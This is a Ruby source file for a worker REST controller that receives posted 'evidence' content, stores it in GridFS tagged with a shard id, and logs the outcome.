require 'rcs-common/path_utils'

require_relative 'rest'
require_release 'rcs-db/grid'

module RCS::Worker
  class WorkerController < RESTController
    def shard_id
      RCS::DB::Config.instance.global['SHARD']
    end

    def store_evidence(ident, instance, content)
      trace :debug, "Storing evidence #{ident}:#{instance} (shard #{shard_id})"
      RCS::DB::GridFS.put(content, {filename: "#{ident}:#{instance}", metadata: {shard: shard_id}}, "evidence")
    end

    def post
      return conflict if @request[:content]['content'].nil?

      ident = @params['_id'].slice(0..13)
      instance = @params['_id'].slice(15..-1).downcase

      # save the evidence in the db
      id = store_evidence(ident, instance, @request[:content]['content'])

      # TODO: this code was used in the rest controller of the db
      # update the evidence statistics
      # StatsManager.instance.add evidence: 1, evidence_size: @request[:content]['content'].bytesize

      trace :info, "Evidence [#{ident}::#{instance}][#{id}] saved and dispatched to shard #{shard_id}"

      ok({:bytes => @request[:content]['content'].size})
    rescue Exception => e
      trace :warn, "Cannot save evidence: #{e.message}"
      trace :fatal, e.backtrace.join("\n")
      not_found
    end
  end
end
